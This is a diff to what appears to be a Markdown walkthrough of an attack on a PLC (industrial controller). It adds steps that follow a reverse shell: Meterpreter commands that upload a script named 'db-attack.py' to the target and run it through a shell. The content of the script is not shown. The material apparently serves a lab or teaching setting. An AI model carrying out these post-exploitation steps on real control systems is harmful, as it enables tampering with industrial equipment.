@@ -136,6 +136,26 @@ exploit
 ```
 
 - When the payload is executed, the attacker will gain a reverse shell into the system.
+- The attacker can now manipulate the plc and executes any scripts he wishes, the attack uploads the `db-attack.py` to plc's machine
+
+Illustration in meterpreter terminal:
+```
+upload /path/to/local/file /path/on/target/ (Upload from attacker to target machine)
+```
+
+Example
+
+Meterpreter terminal
+```
+upload /scripts/db-attack.py /workdir
+```
+- After uplaoding the script in the target's machine, he can execute the script with ease from the meterpreter terminal
+
+Meterpreter terminal
+```
+shell
+python3 db-attack.py
+```
 
 
 
